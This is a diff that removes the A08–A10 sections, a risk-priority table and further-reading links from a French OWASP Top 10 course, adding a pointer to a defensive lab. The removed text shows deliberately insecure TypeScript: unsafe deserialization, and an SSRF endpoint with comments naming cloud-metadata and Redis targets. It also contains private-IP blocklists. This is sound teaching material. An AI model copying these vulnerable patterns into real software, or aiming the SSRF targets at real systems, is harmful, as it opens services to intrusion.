-
----
-
-## A08 — Software and Data Integrity Failures
-
-### Description
-
-Le code et l'infrastructure ne protègent pas contre les violations d'intégrité. Inclut les mises à jour logicielles non vérifiées, les pipelines CI/CD non sécurisés, et la désérialisation non sécurisée.
-
-### Exemple vulnérable
-
-```typescript
-// ❌ Désérialisation non sécurisée
-import { deserialize } from 'node-serialize';
-
-app.post('/api/data', (req, res) => {
-  const obj = deserialize(req.body.payload);
-  // Un payload malicieux peut exécuter du code arbitraire
-  res.json(obj);
-});
-
-// ❌ Charger des scripts depuis des CDN sans vérification d'intégrité
-// <script src="https://cdn.example.com/lib.js"></script>
-```
-
-### Correction
-
-```html
-<!-- ✅ Subresource Integrity (SRI) pour les scripts externes -->
-<script
-  src="https://cdn.example.com/lib.js"
-  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8w"
-  crossorigin="anonymous"
-></script>
-```
-
-```typescript
-// ✅ Vérifier l'intégrité des données avec des signatures
-import crypto from 'node:crypto';
-
-function verifyWebhookSignature(
-  payload: string,
-  signature: string,
-  secret: string
-): boolean {
-  const expected = crypto
-    .createHmac('sha256', secret)
-    .update(payload)
-    .digest('hex');
-  return crypto.timingSafeEqual(
-    Buffer.from(signature),
-    Buffer.from(expected)
-  );
-}
-```
-
-### Prévention
-
-- Vérifier les signatures numériques des dépendances et mises à jour
-- Utiliser Subresource Integrity (SRI) pour les ressources CDN
-- Sécuriser le pipeline CI/CD (accès restreint, audit trail)
-- Ne pas désérialiser de données non fiables
-- Utiliser `npm ci` au lieu de `npm install` en CI pour des builds reproductibles
-
----
-
-## A09 — Security Logging and Monitoring Failures
-
-### Description
-
-Sans logging et monitoring adéquats, les attaques ne sont pas détectées. Le temps moyen de détection d'une brèche est de 204 jours — un logging efficace réduit ce délai.
-
-### Exemple insuffisant
-
-```typescript
-// ❌ Pas de logging des événements de sécurité
-app.post('/api/login', async (req, res) => {
-  const user = await authenticate(req.body);
-  if (!user) return res.status(401).json({ error: 'Unauthorized' });
-  // Aucun log de la tentative échouée
-  res.json({ token: generateJWT(user) });
-});
-```
-
-### Correction
-
-```typescript
-import winston from 'winston';
-
-const securityLogger = winston.createLogger({
-  level: 'info',
-  format: winston.format.json(),
-  defaultMeta: { service: 'auth-service' },
-  transports: [
-    new winston.transports.File({ filename: 'security.log' }),
-  ],
-});
-
-app.post('/api/login', async (req, res) => {
-  const { email } = req.body;
-  const user = await authenticate(req.body);
-
-  if (!user) {
-    // ✅ Logger les échecs d'authentification
-    securityLogger.warn('Login failed', {
-      email,
-      ip: req.ip,
-      userAgent: req.get('user-agent'),
-      timestamp: new Date().toISOString(),
-    });
-    return res.status(401).json({ error: 'Unauthorized' });
-  }
-
-  // ✅ Logger les connexions réussies aussi
-  securityLogger.info('Login successful', {
-    userId: user.id,
-    ip: req.ip,
-    timestamp: new Date().toISOString(),
-  });
-
-  res.json({ token: generateJWT(user) });
-});
-```
-
-### Prévention
-
-- Logger les événements de sécurité : login, échecs d'auth, accès refusés, erreurs
-- Format structuré (JSON) pour faciliter l'analyse automatisée
-- Centraliser les logs (ELK Stack, Datadog, Grafana Loki)
-- Mettre en place des alertes sur les événements critiques
-- Protéger les logs contre la falsification (append-only, signatures)
-- Ne **jamais** logger de données sensibles (mots de passe, tokens, numéros de carte)
-
----
-
-## A10 — Server-Side Request Forgery (SSRF)
-
-### Description
-
-**Nouvelle catégorie en 2021.** L'application effectue des requêtes HTTP vers une URL fournie par l'utilisateur sans validation suffisante, permettant à l'attaquant d'accéder à des ressources internes.
-
-### Exemple vulnérable
-
-```typescript
-// ❌ SSRF — l'utilisateur contrôle l'URL de la requête
-import axios from 'axios';
-
-app.post('/api/fetch-url', async (req, res) => {
-  const { url } = req.body;
-  const response = await axios.get(url);
-  // L'attaquant peut fournir : http://169.254.169.254/latest/meta-data/
-  // pour accéder aux métadonnées AWS EC2
-  // Ou : http://localhost:6379/ pour interagir avec Redis
-  res.json(response.data);
-});
-```
-
-### Correction
-
-```typescript
-import { URL } from 'node:url';
-import dns from 'node:dns/promises';
-
-// ✅ Validation stricte de l'URL
-async function isUrlSafe(urlString: string): Promise<boolean> {
-  try {
-    const url = new URL(urlString);
-
-    // N'autoriser que HTTPS
-    if (url.protocol !== 'https:') return false;
-
-    // Bloquer les IP privées et localhost
-    const addresses = await dns.resolve4(url.hostname);
-    for (const addr of addresses) {
-      if (
-        addr.startsWith('10.') ||
-        addr.startsWith('172.16.') ||
-        addr.startsWith('192.168.') ||
-        addr.startsWith('127.') ||
-        addr === '0.0.0.0' ||
-        addr.startsWith('169.254.')
-      ) {
-        return false;
-      }
-    }
-
-    // Whitelist de domaines autorisés (encore mieux)
-    const allowedDomains = ['api.example.com', 'cdn.example.com'];
-    if (!allowedDomains.includes(url.hostname)) return false;
-
-    return true;
-  } catch {
-    return false;
-  }
-}
-
-app.post('/api/fetch-url', async (req, res) => {
-  const { url } = req.body;
-  if (!await isUrlSafe(url)) {
-    return res.status(400).json({ error: 'URL non autorisée' });
-  }
-  const response = await axios.get(url, { timeout: 5000, maxRedirects: 0 });
-  res.json(response.data);
-});
-```
-
-### Prévention
-
-- Valider et sanitizer toutes les URLs fournies par l'utilisateur
-- Utiliser une whitelist de domaines/IP autorisés
-- Bloquer l'accès aux plages d'IP privées et aux métadonnées cloud
-- Désactiver les redirections HTTP (ou les limiter)
-- Segmenter le réseau pour limiter l'impact d'un SSRF
-- Utiliser un proxy dédié pour les requêtes sortantes
-
----
-
-## Matrice de risque et priorisation
-
-### Évaluation du risque
-
-Le risque se calcule ainsi :
-
-$$\text{Risque} = \text{Probabilité} \times \text{Impact}$$
-
-### Priorisation recommandée
-
-| Priorité | Catégorie | Justification |
-|---|---|---|
-| 🔴 Critique | A01 Broken Access Control | La plus répandue, impact direct |
-| 🔴 Critique | A03 Injection | Peut mener à la compromission totale |
-| 🟠 Haute | A02 Cryptographic Failures | Exposition potentielle de données sensibles |
-| 🟠 Haute | A07 Auth Failures | Usurpation d'identité |
-| 🟡 Moyenne | A08 Integrity Failures | Supply chain attacks en hausse |
-| 🟡 Moyenne | A05 Security Misconfiguration | Facile à corriger, souvent négligé |
-| 🟡 Moyenne | A06 Vulnerable Components | Large surface d'attaque |
-| 🟡 Moyenne | A10 SSRF | Critique dans le cloud |
-| 🔵 Base | A04 Insecure Design | Le plus difficile à corriger |
-| 🔵 Base | A09 Logging Failures | Nécessaire pour détecter les autres |
-
----
-
-## Résumé
-
-Le Top 10 OWASP 2021 reflète l'évolution des menaces web modernes. Les tendances clés :
-
-1. **Broken Access Control** est devenu le risque n°1
-2. **Insecure Design** reconnaît l'importance du design sécurisé
-3. **SSRF** a gagné sa propre catégorie avec l'essor du cloud
-4. **L'injection** reste un classique mais descend grâce aux frameworks modernes
-
-> La connaissance du Top 10 est un minimum. C'est un point de départ, pas une checklist exhaustive de sécurité.
-
----
-
-## Pour aller plus loin
-
-- [OWASP Top 10 — 2021 (officiel)](https://owasp.org/Top10/)
-- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
-- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
-- [OWASP ASVS (Application Security Verification Standard)](https://owasp.org/www-project-application-security-verification-standard/)
+> Lab associé : `labs/lab-01-owasp-top10/README.md`. Exercice **défensif** : cartographier les risques OWASP sur TribuZen (constat → catégorie A0x → parade), puis les **prioriser** par Risque = Probabilité × Impact pour produire `owasp-risk-map.md`. README-only, corrigé commenté, coach en session.
